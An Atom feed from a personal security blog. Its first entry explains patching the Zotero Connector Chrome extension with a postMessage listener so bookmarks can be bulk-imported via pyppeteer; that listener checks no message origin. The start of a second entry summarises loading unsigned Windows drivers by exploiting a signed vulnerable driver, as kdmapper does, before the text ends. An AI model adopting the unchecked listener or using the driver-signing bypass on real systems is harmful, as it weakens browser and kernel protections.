<?xml version="1.0" encoding="utf-8"?><feed xmlns="http://www.w3.org/2005/Atom" ><generator uri="https://jekyllrb.com/" version="3.9.0">Jekyll</generator><link href="https://citrusice.github.io/feed.xml" rel="self" type="application/atom+xml" /><link href="https://citrusice.github.io/" rel="alternate" type="text/html" /><updated>2021-09-02T14:22:14+08:00</updated><id>https://citrusice.github.io/feed.xml</id><title type="html">Nqd8VId6</title><subtitle>my blog
</subtitle><entry><title type="html">将书签导入Zotero</title><link href="https://citrusice.github.io/posts/importing-bookmarks-to-zotero/" rel="alternate" type="text/html" title="将书签导入Zotero" /><published>2021-09-02T14:17:40+08:00</published><updated>2021-09-02T14:17:40+08:00</updated><id>https://citrusice.github.io/posts/importing-bookmarks-to-zotero</id><content type="html" xml:base="https://citrusice.github.io/posts/importing-bookmarks-to-zotero/">&lt;p&gt;接触安全已有两年，这期间看了大量的文章，其中大部分都使用浏览器的收藏夹来保存，还有一小部分用印象笔记的网页剪藏。以书签的方式保存文章并不可靠，经常会遇到文章被删或者由于一些博主换了博客主题而导致之前的url不可用。印象笔记的剪藏固然很好，然而我并不敢投入太多在印象笔记之中（并不是很满意印象笔记，一直在搜寻可替代的软件，投入太多会导致迁移成本的增加），直到朋友向我推荐了Zotero。&lt;/p&gt;

&lt;p&gt;Zotero是一个用于文档管理的开源软件，并且提供浏览器插件用于保存网页，但是并没有提供批量导入的功能，因此只有通过自己实现了。&lt;/p&gt;

&lt;p&gt;Zotero本身提供了一些javscript的接口用于操作Zotero中的item，可以实现增删查改，但是用于保存网页并不方便。而Zotero本身提供了插件用于剪藏，如果能直接调用插件功能来批量导入是最轻松的实现，因此最终我决定使用python操作浏览器，然后通过在页面中执行js代码来调用插件的功能来导入网页。&lt;/p&gt;

&lt;h2 id=&quot;分析chrome插件&quot;&gt;分析Chrome插件&lt;/h2&gt;

&lt;p&gt;首先可以通过这个网址将crx格式的插件下载下来，插件名为zotero-connector https://chrome-extension-downloader.com/&lt;/p&gt;

&lt;p&gt;crx格式的文件可以同过7z直接打开，解压出来后是一个文件夹。其中manifest.json包含了插件的相关信息&lt;/p&gt;

&lt;p&gt;简单了解一下Chrome插件，插件代码可以分为5种：&lt;/p&gt;

&lt;ul&gt;
  &lt;li&gt;injected script&lt;/li&gt;
  &lt;li&gt;content-script&lt;/li&gt;
  &lt;li&gt;popup js&lt;/li&gt;
  &lt;li&gt;background js&lt;/li&gt;
  &lt;li&gt;devtools js&lt;/li&gt;
&lt;/ul&gt;

&lt;p&gt;不同的种的js代码有不同的权限，同时可以访问不同的api，插件的各种功能的实现需要靠这些不同js代码相互协作。&lt;/p&gt;

&lt;p&gt;既然想通过调用插件的功能来实现将网页导入Zotero，首先要找到插件实现功能的位置。一开始想找到单击事件触发的函数，但是由于对Chrome插件的不熟悉不知道该如何找起。于是换了一种思路：从不同js代码之间的通信开始。全局搜索addListener函数，根据文件名/代码上下文找到一些看起来有意思的地方下断，几次测试之后很快就找到了关键位置，在messaging_inject.js中尾部定义了一个Listener用于监听消息。&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;https://raw.githubusercontent.com/CitrusIce/blog_pic/master/image-20210902104536543.png&quot; alt=&quot;image-20210902104536543&quot; /&gt;&lt;/p&gt;

&lt;p&gt;在_messageListeners中定义了事件对应的函数，继续调试几次，找出了其中的重要事件：&lt;/p&gt;

&lt;ul&gt;
  &lt;li&gt;translate：调用translator保存网页&lt;/li&gt;
  &lt;li&gt;saveAsWebpage：直接保存网页&lt;/li&gt;
  &lt;li&gt;update：设置保存条目的属性、位置&lt;/li&gt;
&lt;/ul&gt;

&lt;h2 id=&quot;魔改插件&quot;&gt;魔改插件&lt;/h2&gt;

&lt;p&gt;至此我们已经找到了我们需要的函数，但是这些函数是无法通过js直接调用的。因为这些函数属于content-script，正如插件中使用chrome.runtime.onMessage.addListener通过监听消息来通信一样，我们同样需要通过消息来与content-script通信。普通js要与content-script进行通信需要使用window.addEventListener以及window.postMessage进行通信，在messaging_inject.js中新增以下代码：&lt;/p&gt;

&lt;div class=&quot;language-javascript highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;nb&quot;&gt;window&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;addEventListener&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;dl&quot;&gt;&quot;&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;message&lt;/span&gt;&lt;span class=&quot;dl&quot;&gt;&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;async&lt;/span&gt; &lt;span class=&quot;kd&quot;&gt;function&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;event&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;
			&lt;span class=&quot;k&quot;&gt;if&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;event&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;data&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;type&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;&amp;amp;&amp;amp;&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;event&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;data&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;type&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;==&lt;/span&gt; &lt;span class=&quot;dl&quot;&gt;&quot;&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;save&lt;/span&gt;&lt;span class=&quot;dl&quot;&gt;&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;))&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;
				&lt;span class=&quot;nx&quot;&gt;console&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;log&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;dl&quot;&gt;&quot;&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;Content script received message: &lt;/span&gt;&lt;span class=&quot;dl&quot;&gt;&quot;&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;+&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;event&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;data&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;content&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;title&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
				&lt;span class=&quot;k&quot;&gt;if&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;Zotero&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;Inject&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;translators&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;length&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;!=&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;0&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;
					&lt;span class=&quot;k&quot;&gt;await&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;Zotero&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;Inject&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;translate&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;Zotero&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;Inject&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;translators&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;0&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;].&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;translatorID&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
				&lt;span class=&quot;p&quot;&gt;}&lt;/span&gt;
				&lt;span class=&quot;k&quot;&gt;else&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;
					&lt;span class=&quot;k&quot;&gt;await&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;Zotero&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;Inject&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;saveAsWebpage&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;([&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;event&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;data&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;content&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;title&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;{&lt;/span&gt; &lt;span class=&quot;na&quot;&gt;snapshot&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt; &lt;span class=&quot;kc&quot;&gt;true&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;}]);&lt;/span&gt;
				&lt;span class=&quot;p&quot;&gt;}&lt;/span&gt;
				&lt;span class=&quot;k&quot;&gt;if&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;event&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;data&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;content&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;collection&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;
					&lt;span class=&quot;kd&quot;&gt;var&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;response&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;await&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;Zotero&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;Connector&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;callMethod&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;dl&quot;&gt;&quot;&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;getSelectedCollection&lt;/span&gt;&lt;span class=&quot;dl&quot;&gt;&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;{})&lt;/span&gt;
					&lt;span class=&quot;kd&quot;&gt;var&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;target&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;response&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;targets&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;find&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;((&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;target&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&amp;gt;&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;{&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;return&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;target&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;name&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;==&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;event&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;data&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;content&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;collection&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;})&lt;/span&gt;
					&lt;span class=&quot;k&quot;&gt;if&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;!&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;target&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;
						&lt;span class=&quot;k&quot;&gt;return&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
					&lt;span class=&quot;p&quot;&gt;}&lt;/span&gt;
					&lt;span class=&quot;k&quot;&gt;await&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;_messageListeners&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;dl&quot;&gt;&quot;&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;progressWindowIframe.updated&lt;/span&gt;&lt;span class=&quot;dl&quot;&gt;&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;]({&lt;/span&gt; &lt;span class=&quot;dl&quot;&gt;&quot;&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;target&lt;/span&gt;&lt;span class=&quot;dl&quot;&gt;&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;target&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;dl&quot;&gt;&quot;&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;tags&lt;/span&gt;&lt;span class=&quot;dl&quot;&gt;&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;event&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;data&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;content&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;tags&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;});&lt;/span&gt;

				&lt;span class=&quot;p&quot;&gt;}&lt;/span&gt;
				&lt;span class=&quot;kd&quot;&gt;var&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;data&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;{&lt;/span&gt; &lt;span class=&quot;na&quot;&gt;type&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt; &lt;span class=&quot;dl&quot;&gt;&quot;&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;finish&lt;/span&gt;&lt;span class=&quot;dl&quot;&gt;&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;};&lt;/span&gt;
				&lt;span class=&quot;nb&quot;&gt;window&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;postMessage&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;data&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;dl&quot;&gt;&quot;&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;dl&quot;&gt;&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
			&lt;span class=&quot;p&quot;&gt;}&lt;/span&gt;
			&lt;span class=&quot;k&quot;&gt;else&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;if&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;event&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;data&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;type&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;&amp;amp;&amp;amp;&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;event&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;data&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;type&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;==&lt;/span&gt; &lt;span class=&quot;dl&quot;&gt;&quot;&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;update&lt;/span&gt;&lt;span class=&quot;dl&quot;&gt;&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;))&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;
				&lt;span class=&quot;kd&quot;&gt;var&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;response&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;await&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;Zotero&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;Connector&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;callMethod&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;dl&quot;&gt;&quot;&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;getSelectedCollection&lt;/span&gt;&lt;span class=&quot;dl&quot;&gt;&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;{})&lt;/span&gt;
				&lt;span class=&quot;kd&quot;&gt;var&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;target&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;response&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;targets&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;find&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;((&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;target&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&amp;gt;&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;{&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;return&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;target&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;name&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;==&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;event&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;data&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;text&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;collection&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;})&lt;/span&gt;
				&lt;span class=&quot;k&quot;&gt;if&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;!&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;target&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;
					&lt;span class=&quot;k&quot;&gt;return&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
				&lt;span class=&quot;p&quot;&gt;}&lt;/span&gt;
				&lt;span class=&quot;nx&quot;&gt;_messageListeners&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;dl&quot;&gt;&quot;&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;progressWindowIframe.updated&lt;/span&gt;&lt;span class=&quot;dl&quot;&gt;&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;]({&lt;/span&gt; &lt;span class=&quot;dl&quot;&gt;&quot;&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;target&lt;/span&gt;&lt;span class=&quot;dl&quot;&gt;&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;target&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;dl&quot;&gt;&quot;&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;tags&lt;/span&gt;&lt;span class=&quot;dl&quot;&gt;&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;event&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;data&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;text&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;tags&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;});&lt;/span&gt;

			&lt;span class=&quot;p&quot;&gt;}&lt;/span&gt;
		&lt;span class=&quot;p&quot;&gt;})&lt;/span&gt;

&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;在js控制台中通过类似以下代码即可调用Zotero导入网页：&lt;/p&gt;

&lt;div class=&quot;language-javascript highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;kd&quot;&gt;var&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;data&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;{&lt;/span&gt; &lt;span class=&quot;na&quot;&gt;type&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt; &lt;span class=&quot;dl&quot;&gt;&quot;&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;save&lt;/span&gt;&lt;span class=&quot;dl&quot;&gt;&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;na&quot;&gt;content&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;&lt;span class=&quot;na&quot;&gt;title&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt;&lt;span class=&quot;dl&quot;&gt;&quot;&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;test&lt;/span&gt;&lt;span class=&quot;dl&quot;&gt;&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;na&quot;&gt;collection&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt;&lt;span class=&quot;dl&quot;&gt;&quot;&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;test&lt;/span&gt;&lt;span class=&quot;dl&quot;&gt;&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;na&quot;&gt;tags&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt;&lt;span class=&quot;dl&quot;&gt;&quot;&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;asdf23,444&lt;/span&gt;&lt;span class=&quot;dl&quot;&gt;&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;}};&lt;/span&gt;
&lt;span class=&quot;nb&quot;&gt;window&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;postMessage&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;data&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;dl&quot;&gt;&quot;&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;dl&quot;&gt;&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;同时由于消息的通信都是异步的，我们无法得知插件何时将网页导入完毕，在未导入完毕的情况下关闭页面会导致导入失败，因此我们需要在导入完毕后通知控制端（python）网页导入完毕。由于postMessage是异步的，不存在返回值，我们没法在执行js完毕后返回网页导入完毕的信息。最终的解决方案是在向content-script发送消息前再定义一个Listener，content-script在导入完毕后向这个Listener发送一个message告知导入完毕，这个Listener操作dom在页面中加入一个特殊标签，控制端就不断的检测页面上是否存在这个特殊标签，如果存在则导入完毕、关闭当前页面。&lt;/p&gt;

&lt;h2 id=&quot;频繁关闭新建tab导致的卡死&quot;&gt;频繁关闭/新建tab导致的卡死&lt;/h2&gt;

&lt;p&gt;操作浏览器使用的库是pyppeteer，是puppeteer的python实现，支持异步。原本的逻辑是如果要导入一个网页则新建一个tab并进行导入操作，导入完毕后则关闭tab，实际测试中发现存在一些协程会一直卡死在关闭tab的函数中，不知道是库实现的问题还是其他的。最终改变了思路，使用”池”的方法解决了该问题。类似线程池一样，在导入网页的时候不再新建tab，而是从tab池中获取一个空tab，导入完毕后也不再关闭，而是将tab置空再重新放入tab池中。这种方法不但解决了卡死问题，同时避免了新建/关闭tab时的开销。&lt;/p&gt;

&lt;h2 id=&quot;结尾&quot;&gt;结尾&lt;/h2&gt;

&lt;p&gt;项目已上传github，同时欢迎pull request https://github.com/CitrusIce/ImportBookmarksToZotero&lt;/p&gt;</content><author><name></name></author><category term="develop" /><summary type="html">接触安全已有两年，这期间看了大量的文章，其中大部分都使用浏览器的收藏夹来保存，还有一小部分用印象笔记的网页剪藏。以书签的方式保存文章并不可靠，经常会遇到文章被删或者由于一些博主换了博客主题而导致之前的url不可用。印象笔记的剪藏固然很好，然而我并不敢投入太多在印象笔记之中（并不是很满意印象笔记，一直在搜寻可替代的软件，投入太多会导致迁移成本的增加），直到朋友向我推荐了Zotero。</summary></entry><entry><title type="html">加载无签名驱动</title><link href="https://citrusice.github.io/posts/load-driver-bypassing-dse/" rel="alternate" type="text/html" title="加载无签名驱动" /><published>2021-07-19T14:16:48+08:00</published><updated>2021-07-19T14:16:48+08:00</updated><id>https://citrusice.github.io/posts/load-driver-bypassing-dse</id><content type="html" xml:base="https://citrusice.github.io/posts/load-driver-bypassing-dse/">&lt;p&gt;由于dse的出现，未经签名的驱动无法被内核加载，而使用带有签名的漏洞驱动通过利用漏洞的方式加载无签名的驱动是一种可行的方式。本文将通过分析kdmapper的代码来探究加载无签名驱动的方法。&lt;/p&gt;

&lt;h2 id=&quot;漏洞分析&quot;&gt;漏洞分析&lt;/h2&gt;

